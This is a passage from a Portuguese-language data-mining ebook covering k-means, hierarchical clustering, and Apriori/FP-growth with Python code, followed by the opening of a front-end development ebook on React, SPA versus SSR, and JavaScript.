diversas situações. Por exemplo, na área de varejo é possível segmentar clientes 
com base em suas preferências ou mesmo agrupar produtos semelhantes em 
um estoque. Umas das técnicas mais famosas de clusterização é o k-means que 
utiliza a distância entre os dados para definir os centros dos clusters e então 
agrupar os dados de maneira pertinente. É possível também agrupar os dados 
de forma hierárquica ou com base na densidade dos dados. 
                           
4.2. K-MEANS 
 
O algoritmo K-means funciona com base na distância dos dados até os 
centros. Inicialmente são definidos k centros que na prática são a quantidade de 
clusters que se deseja configurar e na sequência o algoritmo ajusta os centros 
comparando as distâncias em relação aos dados. O valor de k a ser inserido, ou 
seja, a quantidade de clusters que se deseja ajustar é algo que pode variar e 
necessita de investigação. Para ajudar na definição de k existem alguns métodos 
como o silhouette score e o elbow (cotovelo). De forma resumida, ambos os 
métodos analisam a distância entre os pontos e os centros dos clusters e 
retornam valores ponderados. Portanto, no intuito de utilizar ambas as 
abordagens ajusta-se o algoritmo k-means diversas vezes, sendo que em cada 
tentativa um valor de k distinto é escolhido. Dessa forma, para cada execução o 
silhouette e o elbow são calculados e armazenados. No fim, cabe ao especialista 
analisar os resultados e decidir o valor de k. 
 

 
 
Para ilustrar a implementação do k-means utilizaremos o mesmo conjunto 
de dados apresentado na seção anterior, especificamente na Figura 3.1 que 
apresenta indicadores socioeconômicos e fatores de saúde em diversos países. 
Como explicado anteriormente é necessário executar as análises para validar a 
quantidade de clusters (valor de k). 
Foram testados os valores de 2 a 10 para k, e os resultados do elbow e 
silhouette foram armazenados. Especificamente para o método elbow é feito um 
gráfico que lembra um cotovelo (por isso o nome) no qual são inseridos os pares 
que contém o valor de k e a respectiva soma dos quadrados das distâncias 
(medida que efetivamente indica a qualidade da separação dos dados avaliando 
a distância até os centros dos clusters). A Figura 4.1 a seguir ilustra esse gráfico. 
 
 
Figura 4.1: Curva representando o método do cotovelo 

 
 
 
No geral, o que é buscado no gráfico do método do cotovelo é um ponto 
no qual a linha dobra de maneira mais acentuada (dando aparência de um 
cotovelo ao gráfico). Nem sempre fica claro qual é o ponto exato ao analisar o 
gráfico e por isso é interessante realizar alguns procedimentos matemáticos 
(Temporal, 2019). 
Iremos traçar uma linha reta que liga os pontos das extremidades da curva 
do cotovelo e na sequência analisar na curva qual é o ponto mais distante da 
linha reta. Veja a Figura 4.2 a seguir que ilustra a situação. 
 
Figura 4.2: Curva representando o método do cotovelo e o cálculo do 
ponto mais distante da linha vermelha 
 

 
 
Após executar o cálculo da distância de cada ponto na curva azul até a 
linha vermelha encontrou-se o ponto destacado em preto. Esse ponto tem 
coordenadas (4, 16.78) no qual 4 é o valor de k (quantidade de clusters) e 16.78 
é o valor da soma dos quadrados das distâncias calculado pelo algoritmo. 
Portanto esse ponto é o mais distante da linha vermelha e, de acordo com o 
método do cotovelo é o melhor valor de k. Vale ressaltar que esse resultado é 
um indicativo interessante, mas não é a verdade absoluta. É sempre 
recomendado conduzir diversos testes e explorações nos dados até que se 
possa chegar a uma conclusão satisfatória. 
Para fins didáticos, iremos seguir o resultado do método do cotovelo e 
utilizar k = 4. Dessa forma, teremos quatro clusters distintos. Para facilitar a 
visualização, aplicou-se uma PCA ao conjunto de dados, reduzindo de nove 
variáveis para duas no intuito de fazer um gráfico em duas dimensões (Figura 
4.3). 
 

 
 
 
Figura 4.3: Representação gráfica dos quatro clusters utilizando as duas 
componentes da PCA 
 
 
Aparentemente a divisão dos dados em quatro conjuntos parece 
satisfatória visto que os pontos estão bem organizados em partes distintas da 
Figura 4.3 acima. O trecho de código a seguir apresenta a implementação 
completa do k-means passando pela transformação dos dados, aplicação dos 
métodos silhouette e elbow e o plot dos gráficos. 
 
 
 

 
 
import numpy as np 
import pandas as pd 
import matplotlib.pyplot as plt 
from sklearn.preprocessing import MinMaxScaler 
from sklearn.decomposition import PCA 
from sklearn.cluster import KMeans 
from sklearn.metrics import silhouette_score 
 
def numero_otimo_de_clusters(sse: dict) -> tuple[int, float]: 
 
    primeira_chave = list(sse.keys())[0] 
    ultima_chave = list(sse.keys())[-1] 
 
    x1, y1 = primeira_chave, sse[primeira_chave] 
    x2, y2 = ultima_chave, sse[ultima_chave] 
 
    distancias = {} 
    for i in sse.keys(): 
        if i != primeira_chave and i != ultima_chave: 
            x0 = i 
            y0 = sse[i] 
            numerador = abs((y2 - y1) * x0 - (x2 - x1) * y0 + x2 * y1 
- y2 * x1) 
            denominador = np.sqrt((y2 - y1) ** 2 + (x2 - x1) ** 2) 
            distancias[i] = (numerador / denominador) 
 
    return max(distancias, key=distancias.get), sse[max(distancias, 
key=distancias.get)] 
 
df = pd.read_csv('./Datasets/Clustering PCA/Country-data.csv') 
 
df.rename(columns={'country': 'país', 'child_mort': 
'mortalidade_infantil', 'exports': 'exportações', 
                  'health': 'gastos_com_saúde', 'imorts': 
'importações', 'income': 'renda', 'inflation': 'inflação', 
                  'life_expec': 'expectativa_de_vida', 'total_fer': 
'fertilidade_total', 'gdpp': 'PIB_PER_CAPITA'}, 
          inplace=True) 
 
print('DADOS ORIGINAIS\n') 
print(df.head()) 
 
scaler = MinMaxScaler() 
 
data_transformed = scaler.fit_transform(df.drop('país', axis=1)) 
df_transformed = pd.DataFrame(data=data_transformed, 
columns=df.drop('país', axis=1).columns) 
df_transformed = pd.concat([df['país'], df_transformed], axis=1) 
 
print('DADOS TRANSFORMADOS UTILIZANDO MINMAX\n') 
print(df_transformed.head()) 
 
print('SELECIONAR A QUANTIDADE IDEAL DE CLUSTERS\n') 
 
silhouette_dict = {} 
sse = {} 
 
 
 

 
 
 
for n in range(2, 11): 
    kmeans = KMeans(n_clusters=n, random_state=0) 
    silhouette_dict[n] = silhouette_score(df_transformed.drop('país', 
axis=1).copy(), 
                                          
kmeans.fit_predict(df_transformed.drop('país', axis=1).copy())) 
    sse[n] = kmeans.inertia_ 
 
best_k_silhouette = max(silhouette_dict, key=silhouette_dict.get) 
print(f'VALOR DE K UTILIZANDO SILHOUETTE: {best_k_silhouette}') 
best_k_elbow, best_value_elbow = numero_otimo_de_clusters(sse) 
print(f'VALOR DE K UTILIZANDO ELBOW: {best_k_elbow}') 
 
primeira_chave = list(sse.keys())[0] 
ultima_chave = list(sse.keys())[-1] 
x_values = [primeira_chave, ultima_chave] 
y_values = [sse[primeira_chave], sse[ultima_chave]] 
 
plt.figure(figsize=(10,8)) 
plt.plot(sse.keys(), sse.values()) 
plt.plot(x_values, y_values, 'ro', linestyle='--') 
plt.plot(best_k_elbow, best_value_elbow, 'ok') 
plt.xlabel('Número de clusters', fontsize=12, fontweight='bold') 
plt.ylabel('Soma dos quadrados das distâncias', fontsize=12, 
fontweight='bold') 
plt.title('Método do cotovelo (elbow)', fontsize=12, 
fontweight='bold') 
plt.savefig('./Elbow Method K-Means.png', bbox_inches='tight') 
plt.close() 
 
print(f'MELHOR PAR DE VALORES({best_k_elbow}, {best_value_elbow})\n') 
 
kmeans = KMeans(n_clusters=best_k_elbow, random_state=0) 
kmeans.fit_predict(df_transformed.drop('país', axis=1)) 
 
df_transformed['cluster'] = kmeans.labels_ 
 
print('DADOS TRANSFORMADOS E COM A COLUNA CLUSTER\n') 
print(df_transformed.head()) 
 
pca = PCA(n_components=2) 
X = pca.fit_transform(df_transformed.drop('país', axis=1)) 
df_pca = pd.DataFrame(data=X, columns=['component 1', 'component 2']) 
df_pca['cluster'] = kmeans.labels_ 
 
plt.figure(figsize=(10,8)) 
plt.scatter(df_pca['component 1'], df_pca['component 2'], 
c=df_pca['cluster']) 
plt.xlabel('component 1', fontsize=12, fontweight='bold') 
plt.ylabel('component 2', fontsize=12, fontweight='bold') 
plt.title('Clusters utilizando as componentes da PCA', fontsize=12, 
fontweight='bold') 
plt.savefig('./Cluster Using PCA.png', bbox_inches='tight') 
plt.close() 
 

 
 
Em relação ao método silhouette score, valores mais próximos de 1 
indicam uma melhor separação dos dados em relação àquela quantidade de 
clusters (k). Valores próximos de -1 são os piores possíveis e valores próximos 
de 0 indicam clusters que se sobrepõem. A Tabela 4.1 abaixo apresenta os 
valores de silhouette obtidos. O maior valor é 0.376714 referente à k=2. 
Portando, olhando para esse coeficiente, devemos trabalhar com dois clusters. 
Nesse momento fica uma dúvida referente aos dois métodos (silhouette e elbow) 
pois estão indicando valores distintos de k. Para obter um bom resultado é 
necessário conduzir uma exploração mais completa no conjunto de dados. Vale 
ressaltar que para fins didáticos implementamos o k-means utilizando k=4 já 
discutido anteriormente, mas poderíamos ter utilizado o valor k=2, ou mesmo 
conduzir mais análises a fim de averiguar qual o melhor resultado possível.  
k 
silhouette 
2 
0.376714 
3 
0.342655 
4 
0.346002 
5 
0.240452 
6 
0.233708 
7 
0.223302 
8 
0.243356 
9 
0.233399 
10 
0.217807 
Tabela 4.1: Valores calculados do método silhouette 
 

 
 
4.3. CLUSTER HIERÁRQUICO 
 
Outra abordagem de clusterização bastante interessante é a aglomerativa 
(hierárquica) que agrupa os dados com base em sua similaridade. O processo é 
feito por meio de uma repetição analisando os dados de baixo para cima (bottom-
up) de maneira a ir analisando as distâncias até que todos os dados tenham sido 
devidamente categorizados. Para ilustrar a implementação faremos uso da 
biblioteca Scipy (Virtanen et al., 2020) e dos mesmos dados da seção anterior. 
Aqui, para fins ilustrativos e didáticos, será feito um corte no dataset para utilizar 
apenas os vinte primeiros registros.  Essa redução se deve pelo fato de que será 
apresentado um tipo de gráfico que ficaria muito poluído visualmente e pouco 
explicativo no caso em que fossem utilizados todos os dados disponíveis. 
Para dar início ao processo, os dados são transformados (MinMaxScaler) 
e então removidos os vinte primeiros registros como já explicado anteriormente. 
A Figura 4.4 abaixo ilustra o dataset preparado para o processo de clusterização. 
 
 
 

 
 
 
Figura 4.4: Dataset transformado contendo os vinte primeiros registros do 
conjunto original 
 
Utilizando a biblioteca Scipy obtemos o dendrograma que ilustra como os 
dados estão estruturados (Figura 4.5).  

 
 
 
Figura 4.5: Dendrograma mostrando os níveis de agrupamento dos dados 
 
 
Na dendrograma acima, cada folha (pontos na base da figura) representa 
uma amostra de dados (dentre as 20 que foram selecionadas) e no topo (raiz) a 
junção representa o dataset completo. A distância (eixo y) indica o quão similares 
os clusters são entre si. É interessante analisar nessa figura as ramificações que 
indicam exatamente como os dados se agrupam. As cores juntamente com as 
ramificações no dendrograma indicam de maneira clara os dados mais similares 
e a estruturação dos clusters. Para definir a quantidade de clusters por meio do 
dendrograma passa-se uma linha horizontal em determinada altura. Cada linha 
que cruzar essa horizontal será um cluster distinto.  
 

 
 
Aqui vale ressaltar novamente a discussão com o time e a reflexão com 
base nos dados, visto que a altura dessa linha horizontal (distância) indica 
exatamente a similaridade entre os dados. Mantendo o foco didático do nosso 
texto, faremos uma linha horizontal na altura de 0,75. Observando a Figura 4.5, 
é possível perceber que traçar a linha horizontal nessa altura determina 3 
clusters, o primeiro possui as amostras 3, 0 e 17, o segundo possui as amostras 
7, 8 e 15 e o terceiro as restantes (5, 9, 12, 2, 19, 16, 18, 14, 1, 6, 11, 4, 10, 13). 
A Figura 4.6 abaixo mostra o dataset com a coluna cluster mais à direita. 
 
 
Figura 4.6: Dataset com a coluna indicando o cluster de cada amostra 
 
O trecho de código abaixo ilustra a implementação completa da abordagem de 
clusterização hierárquica. 
 
 
 

 
 
import pandas as pd 
import matplotlib.pyplot as plt 
from sklearn.preprocessing import MinMaxScaler 
from sklearn.decomposition import PCA 
from scipy.cluster.hierarchy import dendrogram, linkage, fcluster 
 
df = pd.read_csv('./Datasets/Clustering PCA/Country-data.csv') 
 
df.rename(columns={'country':'país', 
'child_mort':'mortalidade_infantil', 'exports':'exportações', 
                  'health':'gastos_com_saúde', 'imorts':'importações', 
'income':'renda', 'inflation':'inflação', 
                  'life_expec':'expectativa_de_vida', 
'total_fer':'fertilidade_total' , 'gdpp':'PIB_PER_CAPITA'}, 
          inplace=True) 
 
scaler = MinMaxScaler() 
 
data_transformed = scaler.fit_transform(df.drop('país', axis=1)) 
df_transformed = pd.DataFrame(data=data_transformed, 
columns=df.drop('país', axis=1).columns) 
df_transformed = pd.concat([df['país'], df_transformed], axis=1) 
 
X_cluster = df_transformed.drop('país', axis=1).iloc[:20].copy() 
Z = linkage(X_cluster, 'ward') 
 
max_d = 0.75 
clusters = fcluster(Z, max_d, criterion='distance') 
X_cluster['cluster'] = clusters 
 
plt.figure(figsize=(10,8)) 
dendrogram(Z) 
plt.title('Dendrogram do Cluster Hierárquico', fontsize=12, 
fontweight='bold') 
plt.xlabel('Índice da amostra', fontsize=12, fontweight='bold') 
plt.ylabel('Distância', fontsize=12, fontweight='bold') 
plt.savefig('./Dendograma_Cluster_Hierarquico.png') 
 
pca = PCA(n_components=2) 
X = pca.fit_transform(X_cluster.drop('cluster', axis=1)) 
df_pca = pd.DataFrame(data=X, columns=['component 1', 'component 2']) 
df_pca['cluster'] = clusters 
 
plt.figure(figsize=(10,8)) 
plt.scatter(df_pca['component 1'], df_pca['component 2'], 
c=df_pca['cluster']) 
plt.xlabel('component 1', fontsize=12, fontweight='bold') 
plt.ylabel('component 2', fontsize=12, fontweight='bold') 
plt.title('Clusters utilizando as componentes da PCA', fontsize=12, 
fontweight='bold') 
plt.savefig('./Cluster Hierarquico Using PCA.png', 
bbox_inches='tight') 
 
 
 

 
 
UNIDADE 5 REGRAS DE ASSOCIAÇÕES 
 
Nessa unidade faremos o estudo de modelos que são capazes de analisar 
relações entre os dados. Essas relações são também conhecidas como padrões 
frequentes e estamos interessados em minerar/descobrir tais relações. 
 
OBJETIVOS DA UNIDADE 5 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar novos modelos capazes de analisar padrões frequentes 
 
• Compreender a importância dos padrões frequentes em conjuntos de 
dados 
 

 
 
5.1. MINERAÇÃO DE PADRÕES FREQUENTES 
 
A mineração de padrões frequentes abrange técnicas que analisam 
conjuntos de dados em busca de padrões que se repetem. É amplamente 
utilizado em loja virtuais (e-commerce) com o intuito de compreender os 
comportamentos de compra e recomendar produtos aos clientes. Dessa forma, 
é possível compreender quais produtos são frequentemente adquiridos em 
conjunto. Tais técnicas podem ser utilizadas também para analisar padrões 
fraudulentos que se assemelham e ocorrem em conjunto. Apriori e Fpgrowth 
(Faceli et al., 2023)são dois algoritmos comuns e bastante utilizados para a 
tarefa de mineração de padrões frequentes. Iremos ilustrar em mais detalhes 
suas implementações nas próximas seções por meio da biblioteca MLxtend 
(Raschka, 2018). 
 
5.1. APRIORI 
 
 
O algoritmo Apriori foi o primeiro a surgir com o objetivo de minerar 
padrões frequentes e utiliza uma estratégia de busca em largura (Faceli et al., 
2023). Para exemplificar sua utilização iremos utilizar um conjunto de dados de 
vendas de jogos de videogame obtido no Kaggle. Esse conjunto possui 5918 
registros de vendas de jogos e seus primeiros cinco registros podem ser vistos 
na Figura 5.1 abaixo. 
 
 
Figura 5.1: Dataset contendo vendas de jogos de videogame 

 
 
 
Na figura acima, cada linha representa uma venda distinta e o nosso 
objetivo com o algoritmo Apriori é analisar os padrões dos dados e verificar quais 
jogos são frequentemente comprados em conjunto. Interessante destacar que a 
biblioteca MLxtend possui um encoder que transforma o dataframe de maneira 
a indicar os nomes dos elementos (nesse exemplo jogos) nas colunas e sua 
presença ou ausência naquela transação por meio de variáveis booleanas (True 
ou False). Veja a Figura 5.2 abaixo que é o resultado da transformação da Figura 
5.1. 
 
 
Figura 5.2: Dataset transformado utilizando variáveis booleanas 
 
Finalmente o conjunto de dados está preparado para ser aplicado ao 
algoritmo Apriori. Basta chamar o método passando o dataset e o parâmetro de 
suporte mínimo (varia de 0 a 1). Esse parâmetro é muito importante visto que ele 
define o percentual de vezes que determinados subconjuntos aparecem em 
relação ao total de dados. Por exemplo, se o valor do suporte mínimo for de 0,05, 
estamos informando ao algoritmo que estamos interessados em encontrar 
padrões que se repitam pelo menos 5% em relação ao total de dados. Em nosso 
dataset de jogos possuímos 5918 amostras. Olhando para 5% dos dados, 
implica em aproximadamente 296 registros nos quais o mesmo padrão de 
compra de jogos aparece. Vale ressaltar novamente que o entendimento dos 
dados é muito importante, e algoritmos de mineração de padrões como Apriori 
são ferramentas poderosas. Em muitos casos, valores de suporte mínimo muito 
altos (0,7 por exemplo) podem não retornar resultados, visto que provavelmente 
não existe um percentual tão alto de qualquer padrão naquele conjunto de dados. 

 
 
Após a execução do algoritmo temos um novo dataframe contendo os 
padrões encontrados (itemsets) e os respectivos valores de suporte (Figura 5.3). 
 
Figura 5.3: Resultado do algoritmo Apriori 
 
A resposta possui muitas linhas e se torna inviável exibir todas elas, além 
disso, os nomes dos jogos são grandes, o que dificulta ver os itemsets completos 
nos índices finais (a partir de 293). O resultado, no entanto, é bem completo, 
visto que nesse dataframe é possível ver o suporte mínimo para cada itemset e 
quais são os jogos adquiridos frequentemente juntos. Para melhorar a 
visualização e com intuito ilustrativo será utilizado o comando explode() da 
biblioteca Pandas nas linhas 296 e 297 para separar os itens e melhorar a 
visualização (Figura 5.4). 

 
 
 
Figura 5.4: Itens expandidos para os índices 296 e 297 do resultado do 
algoritmo Apriori 
 
É possível perceber que The Elder Scrolls V: Skyrim, The Last of Us e 
Resident Evil 4 são frequentemente adquiridos juntos com um suporte mínimo 
de aproximadamente 8%. Super Mario World, The Last of Us e The Elder Scrolls 
V: Skyrim possuem um suporte mínimo de aproximadamente 9%. Como visto da 
Figura 5.3 os resultados são extensos e necessitam de análise cuidadosa, 
porém, o objetivo desse texto foi apenas ilustrar e clarificar o uso do algoritmo, 
não sendo possível analisar o resultado em sua completude. O trecho de código 
abaixo apresenta a implementação completa do algoritmo Apriori. Algumas 
modificações nos nomes das colunas foram conduzidas para deixar o conjunto 
de dados mais simples e legível. 
 
 
 
 
 

 
 
import pandas as pd 
from mlxtend.preprocessing import TransactionEncoder 
from mlxtend.frequent_patterns import apriori 
 
df = pd.read_csv('./Datasets/games_sales_dataset.csv') 
 
df.drop(['Unnamed: 6', 'Unnamed: 7', 'Unnamed: 8', 'Unnamed: 9', 
'Unnamed: 10', 'Unnamed: 11'], 
        axis=1, inplace=True) 
df.dropna(inplace=True, ignore_index=True) 
 
df.rename(columns={'God of War':'Coluna 1', 'The Last of Us':'Coluna 
2', 'Read Dead Redemption':'Coluna 3', 
                   'Minecraft':'Coluna 4', 'Grand Theft Auto 
V':'Coluna 5', 'Left 4 Dead':'Coluna 6'}, 
                   inplace=True) 
 
te = TransactionEncoder() 
te_array = te.fit_transform(df.values) 
df_transformed = pd.DataFrame(data=te_array, columns=te.columns_) 
 
print('DADOS TRANSFORMADOS PELO ENCODER\n') 
print(df_transformed.head()) 
 
df_item_frequentes_apriori = apriori(df_transformed, min_support=0.05, 
use_colnames=True) 
 
print('ITENS FREQUENTES\n') 
print(df_item_frequentes_apriori) 
 
 
 
 
 
 
 
 
 
 
 

 
 
5.2. FP-GROWTH 
 
O algoritmo FP-growth utiliza a estratégia de busca por profundidade em 
árvores para minerar os padrões frequentes. Basicamente o método constrói 
uma árvore para armazenar as regras de associação relativas aos dados (Faceli 
et al., 2023). Da mesma maneira que o Apriori é um algoritmo bastante utilizado 
e eficaz na busca por padrões frequentes. Para ilustrar seu funcionamento será 
utilizado o mesmo conjunto de dados de jogos de videogame previamente 
discutido. Além disso, a estratégia de encoder dos dados é a mesma já vista 
para o Apriori. Na prática o que muda é a chamada do algoritmo em si, pois os 
demais passos são iguais aos já apresentados. Veja o trecho de código abaixo. 
 
import pandas as pd 
from mlxtend.preprocessing import TransactionEncoder 
from mlxtend.frequent_patterns import fpgrowth 
 
df = pd.read_csv('./Datasets/games_sales_dataset.csv') 
 
df.drop(['Unnamed: 6', 'Unnamed: 7', 'Unnamed: 8', 'Unnamed: 9', 
'Unnamed: 10', 'Unnamed: 11'], 
        axis=1, inplace=True) 
df.dropna(inplace=True, ignore_index=True) 
 
df.rename(columns={'God of War':'Coluna 1', 'The Last of Us':'Coluna 
2', 'Read Dead Redemption':'Coluna 3', 
                   'Minecraft':'Coluna 4', 'Grand Theft Auto 
V':'Coluna 5', 'Left 4 Dead':'Coluna 6'}, 
                   inplace=True) 
 
te = TransactionEncoder() 
te_array = te.fit_transform(df.values) 
df_transformed = pd.DataFrame(data=te_array, columns=te.columns_) 
 
print('DADOS TRANSFORMADOS PELO ENCODER\n') 
print(df_transformed.head()) 
 
df_item_frequentes_fpgrowth = fpgrowth(df_transformed, 
min_support=0.05, use_colnames=True) 
 
print('ITENS FREQUENTES\n') 
print(df_item_frequentes_fpgrowth) 
 
 

 
 
 
 
Figura 5.5: Resultado do algoritmo FP-growth 
A Figura 5.5 acima ilustra os resultados do algoritmo FP-growth que 
parecem ser um pouco diferentes em relação ao Apriori. Abaixo seguem os 
últimos itens expandidos para uma melhor compreensão.  
 
 

 
 
 
Figura 5.6: Itens expandidos para os índices 296 e 297 do resultado do 
algoritmo FP-growth 
 
É possível ver que utilizando o FP-growth houve mudanças nos padrões 
extraídos. Para esses dois últimos registros (296 e 297) apareceram os jogos 
Guitar Hero 3, God of War e Read Dead Redemption. Tais mudanças podem ser 
simplesmente na ordem dos índices e o Apriori pode ter encontrado os mesmos 
padrões, mas não exatamente nas últimas posições do dataframe de resultados. 
Reforço aqui sempre inspecionar com cuidado os resultados e compreender o 
contexto geral dos dados. 
 
 
 
 

 
 
FINALIZAR 
 
Após a leitura desse material, espero que o aprendizado dos conceitos 
relacionados à mineração de dados esteja mais fácil. Como dito anteriormente, 
essa foi uma introdução ao assunto e abrirá caminho para diversos outros 
conceitos. 
As técnicas utilizadas nesse material são básicas e de caráter educativo, 
visto que o leitor precisa se familiarizar com os conteúdos e amadurecer aos 
poucos para conseguir compreender tópicos mais complexos. Os modelos de 
mineração de dados apresentados aqui foram todos utilizados com suas 
configurações padrão. O leitor pode buscar se aprofundar em técnicas que 
buscam os melhores parâmetros dentro de um conjunto definido para cada 
modelo. 
Além disso, várias questões mais profundas relacionadas aos modelos 
não foram abordadas visto que são um pouco mais complexas para esse início 
de jornada. 
Espero que esse material tenha despertado a curiosidade no leitor para 
continuar investigando esse mundo maravilhoso dos dados. Parabenizo o 
esforço empregado até aqui e convido o leitor a mergulhar de cabeça nos 
estudos pois vale a pena. 
Prof. Dr. Thiago Santana Lemes 
 
 
 
 
 
 
 
 
 

 
 
Sobre o autor 
 
Thiago Santana Lemes é doutor em Engenharia Elétrica e de Computação pela 
Universidade Federal de Goiás (UFG), Cientista de dados na Ernst Young (EY). 
Experiência docente no ensino básico atuando na disciplina de matemática e nos 
cursos de Engenharia e Sistemas de Informação atuando nas disciplinas de 
cálculo diferencial, álgebra linear, cálculo numérico, equações diferenciais, 
probabilidade e estatística, algoritmos dentre outras. Desenvolve pesquisas na 
área de inteligência artificial com modelos de Machine Learning (implementação 
de modelos de regressão, classificação e recomendação), Deep Learning (redes 
convolucionais, redes recorrentes) e modelos de otimização (algoritmos 
genéticos e modelos lineares). 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
Referências Bibliográficas 
 
Faceli, K., Lorena, A. C., Gama, J., Almeida, T. A. de, & Carvalho, A. C. P. L. F. 
de. (2023). Inteligência Artificial Uma Abordagem de Aprendizado de 
Máquina (2nd ed.). LTC. 
Goldschmidt, R., & Passos, E. (2005). Data Mining Um Guia Prático. Elsevier. 
Harris, C. R., Millman, K. J., van der Walt, S. J., Gommers, R., Virtanen, P., 
Cournapeau, D., Wieser, E., Taylor, J., Berg, S., Smith, N. J., Kern, R., Picus, 
M., Hoyer, S., van Kerkwijk, M. H., Brett, M., Haldane, A., del Río, J. F., 
Wiebe, M., Peterson, P., … Oliphant, T. E. (2020). Array programming with 
NumPy. Nature, 585(7825), 357–362. https://doi.org/10.1038/s41586-020-
2649-2 
Hunter, J. D. (2007). Matplotlib: A 2D Graphics Environment. Computing in 
Science & Engineering, 9(3), 90–95. https://doi.org/10.1109/MCSE.2007.55 
Pedregosa, F. and V., G. and Gramfort, A. and Michel, V. and Thirion, B. and 
Grisel, O. and Blondel, M. and Prettenhofer, P. and Weiss, R. and Dubourg, 
V. and Vanderplas, J. and Passos, A. and Cournapeau, D. and Brucher, M. 
and Perrot, & M. and Duchesnay. (2011). Scikit-learn: Machine Learning in 
Python. Journal of Machine Learning Research, 12, 2825–2830. 
Raschka, S. (2018). MLxtend: Providing machine learning and data science 
utilities and extensions to Python’s scientific computing stack. Journal of 
Open Source Software, 3(24), 638. https://doi.org/10.21105/joss.00638 
Temporal, J. (2019). Como definir o número de clusters para o seu KMeans. 
Https://Medium.Com/Pizzadedados/Kmeans-e-Metodo-Do-Cotovelo-
94ded9fdf3a9. 
The pandas development team. (2024). Pandas. Https://Pandas.Pydata.Org. 
Virtanen, P., Gommers, R., Oliphant, T. E., Haberland, M., Reddy, T., 
Cournapeau, D., Burovski, E., Peterson, P., Weckesser, W., Bright, J., van 
der Walt, S. J., Brett, M., Wilson, J., Millman, K. J., Mayorov, N., Nelson, A. 
R. J., Jones, E., Kern, R., Larson, E., … Vázquez-Baeza, Y. (2020). SciPy 
1.0: fundamental algorithms for scientific computing in Python. Nature 
Methods, 17(3), 261–272. https://doi.org/10.1038/s41592-019-0686-2 
Waskom, M. (2021). seaborn: statistical data visualization. Journal of Open 
Source Software, 6(60), 3021. https://doi.org/10.21105/joss.03021 


--- Fim do arquivo: eBook - Data Mining.pdf ---

--- Começo do arquivo: eBook - Desenvolvimento Front-End 2.pdf ---

7 
 
 
projetos para realizar tarefas específicas, como manipulação de DOM, chamadas de API ou cálculos 
matemáticos. As bibliotecas são projetadas para serem modulares, o que significa que os 
desenvolvedores podem escolher quais partes usar e integrá-las em seus próprios códigos conforme 
necessário. Exemplos de bibliotecas populares incluem React e jQuery. 
 
Já os frameworks possuem uma coleção de recursos organizados, mas também possuem um fluxo 
de trabalho ou uma estrutura pré-criados para serem seguidos, ou seja, é uma estrutura mais 
abrangente que fornece uma arquitetura de base para o desenvolvimento de aplicativos. Ele define 
uma estrutura para a organização do código, fluxo de controle e padrões de design, além de 
fornecer ferramentas e utilitários para facilitar o desenvolvimento. Os frameworks geralmente 
impõem uma certa maneira de fazer as coisas e tendem a ser mais opinativos em relação ao design 
e à estrutura do código, sendo assim mais potente que apenas uma biblioteca. Exemplos de 
frameworks populares incluem Angular, Django e Vue.js. 
 
1.3 A Biblioteca React 
O React é uma biblioteca JavaScript para construção de interfaces interativas criada pelo Facebook 
e utilizada por grandes empresas como Netflix e Airbnb. Essas interfaces podem ser web (React 
JS), mobile (React Native) ou interfaces de realidade virtual (React 360). Importante reforçar que 
o React não é um framework, ele é uma biblioteca responsável por renderizar componentes 
reutilizáveis da camada de visualização. Vários frameworks utilizam o React, como por exemplo, o 
NextJS que é um framework que usa o React como base e permite integrar tanto o front-end quanto 
o back-end na própria aplicação, aumentando assim a potencialidade do React. Exemplos de 
frameworks populares baseados na biblioteca React são o NextJS, Gatsby e Electron. 
 
1.4. Single-Page Application e Server-Side Rendering  
As Single-page Applications (SPA) e Server-Side Rendering (SSR) são duas abordagens diferentes 
para a construção de aplicativos web, cada uma com suas próprias características e vantagens.  A 
principal diferença entre SPAs e SSRs reside no momento em que o conteúdo é renderizado e como 
ele é entregue ao usuário. Basicamente, nas SPAs, o conteúdo é renderizado no navegador do 
usuário usando JavaScript, enquanto no SSR, o conteúdo é renderizado no servidor antes de ser 
enviado ao navegador. 
 
Server-Side Rendering é uma técnica na qual as páginas da web são renderizadas no servidor e 

8 
 
 
enviadas ao navegador do usuário como HTML completo. Isso significa que, em vez de carregar 
uma página em branco e preenchê-la com conteúdo usando JavaScript, o servidor gera o HTML 
completo com base no estado atual da aplicação e o envia ao navegador. Isso pode melhorar 
significativamente o tempo de carregamento inicial e a renderização do conteúdo, especialmente 
em dispositivos com recursos limitados ou conexões de internet lentas.  
 
 
FONTE: https://alexandreserra.com/articles/web-design-patterns 
 
Uma Single-page Application é uma aplicação web que carrega uma única página HTML inicial e, 
em seguida, atualiza dinamicamente partes da página conforme o usuário interage com a aplicação. 
Em uma SPA, todo o código JavaScript, CSS e conteúdo necessário é carregado de uma vez, 
geralmente durante a primeira visita do usuário ao site. Depois disso, as interações subsequentes 
do usuário são gerenciadas pelo JavaScript, que manipula as transições de página, solicitações de 
dados e atualizações de interface do usuário sem precisar recarregar a página inteira. Isso resulta 
em uma experiência de usuário mais fluida e responsiva.  
 
 

9 
 
 
FONTE: https://alexandreserra.com/articles/web-design-patterns 
 
 
Single-page Applications (SPA) e Server-Side Rendering (SSR) são padrões de renderização 
(rendering patterns), mas não são os únicos. Para conhecer outros padrões visite o site: 
https://www.freecodecamp.org/news/rendering-patterns/ 
 
Nesta disciplina construiremos páginas SPA, isso porque queremos tirar do servidor a 
responsabilidade de renderizar uma página. Por exemplo, suponha que precisamos mostrar na 
página uma lista de clientes que está armazenada no banco de dados. A aplicação Back-end não 
precisará ser responsável por montar a estrutura visual da aplicação. Ela fará toda consulta no 
banco de dados e montará uma estrutura de dados, como um json, por exemplo, e retornará isso 
para uma outra aplicação, o Front-end que converterá tudo isso para HTML, CSS e JavaScript. 
 
O Back-end poderia ser escrito em Python, Java, C# ou qualquer outra linguagem ou framework. 
Já o Front-end, que é o que estamos aprendendo nessa disciplina, poderia ser escrito em Angular, 
Vue ou ReactJS, este último é o que vamos usar.  
 
1.5. Introdução ao Javascript 
JavaScript é uma linguagem de programação interpretada. É uma linguagem versátil, que permite 
a criação de aplicações tanto no lado do cliente quanto no lado do servidor, graças a ambientes 
como o Node.js. 
 
JavaScript é amplamente utilizada para adicionar interatividade e dinamismo a páginas web, como 
validação de formulários, animações, manipulação do DOM (Document Object Model) e 
comunicação assíncrona com o servidor por meio de requisições AJAX (Asynchronous JavaScript 
and XML). Além disso, é uma das linguagens fundamentais para o desenvolvimento de aplicativos 
web modernos, sendo a base de muitos frameworks e bibliotecas populares, como Angular, React 
e Vue.js. 
 
